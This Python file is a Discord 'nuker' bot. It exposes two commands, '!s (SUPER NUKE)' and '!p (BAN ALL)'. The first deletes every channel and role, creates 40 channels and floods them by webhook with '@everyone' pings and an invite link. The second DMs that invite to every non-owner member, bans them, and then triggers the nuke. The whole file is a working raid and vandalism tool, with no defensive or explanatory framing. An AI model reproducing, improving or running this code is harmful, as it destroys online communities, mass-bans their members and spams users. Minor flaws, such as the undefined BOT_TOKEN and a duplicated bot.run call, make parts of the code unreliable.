import discord
from keep_alive import keep_alive
from discord.ext import commands
import asyncio
import os
import sys
from pystyle import Colorate, Colors



DM_MESSAGE = "เก็ทฮายเอ็กซ์ https://discord.gg/9ethi9hx"

SPAM_CONTENT = "@everyone @here https://discord.gg/9ethi9hx"

CHANNEL_NAME ="เก็ทฮายเอ็กซ์"

WEBHOOK_NAME = "เก็ทฮาย"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

def get_banner(status="ONLINE"):
    logo_text = f"""
Support by @rexlwhite
    """
    return Colorate.Horizontal(Colors.blue_to_cyan, logo_text)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

async def fast_spam(channel):
    try:
        webhook = await channel.create_webhook(name=WEBHOOK_NAME)
        for _ in range(300):
            await webhook.send(SPAM_CONTENT)
            await asyncio.sleep(0.2)
    except:
        pass

async def dm_and_ban(member, guild):
    try: await member.send(DM_MESSAGE)
    except: pass
    try: await guild.ban(member, reason="Purge")
    except: pass

@bot.command()
async def s(ctx):
    if not ctx.guild: return
    try: await ctx.message.delete()
    except: pass

    all_channels = list(ctx.guild.channels)
    all_roles = [r for r in ctx.guild.roles if not r.managed and r.name != "@everyone"]
    targets = all_channels + all_roles

    await asyncio.gather(*(t.delete() for t in targets), return_exceptions=True)

    create_tasks = [ctx.guild.create_text_channel(name=CHANNEL_NAME) for _ in range(40)]
    channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    spam_tasks = [fast_spam(ch) for ch in channels if isinstance(ch, discord.TextChannel)]
    await asyncio.gather(*spam_tasks, return_exceptions=True)

@bot.command()
async def p(ctx):
    if not ctx.guild: return
    try: await ctx.message.delete()
    except: pass

    members = [m for m in ctx.guild.members if not m.bot and m != ctx.guild.owner]

    batch_size = 25 
    for i in range(0, len(members), batch_size):
        batch = members[i:i+batch_size]
        await asyncio.gather(*(dm_and_ban(m, ctx.guild) for m in batch), return_exceptions=True)
        await asyncio.sleep(0.03)

    await ctx.invoke(bot.get_command('s'))

@bot.event
async def on_ready():
    clear_screen()
    print(get_banner(status=f"READY | {bot.user}"))
    print(Colorate.Horizontal(Colors.green_to_white, "Commands: !p (BAN ALL) | !s (SUPER NUKE)"))

if __name__ == "__main__":
    clear_screen()
    print(Colorate.Horizontal(Colors.blue_to_cyan, " [!] INITIALIZING SYSTEM... "))

    target_token = BOT_TOKEN.strip()
    if not target_token:
        target_token = input(Colorate.Horizontal(Colors.blue_to_white, " ENTER BOT TOKEN: ")).strip()

    try:
        bot.run(target_token)
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f" [!] Error: {e}"))
        input(" Press Enter to exit...")

keep_alive()

bot.run(os.getenv('TOKEN'))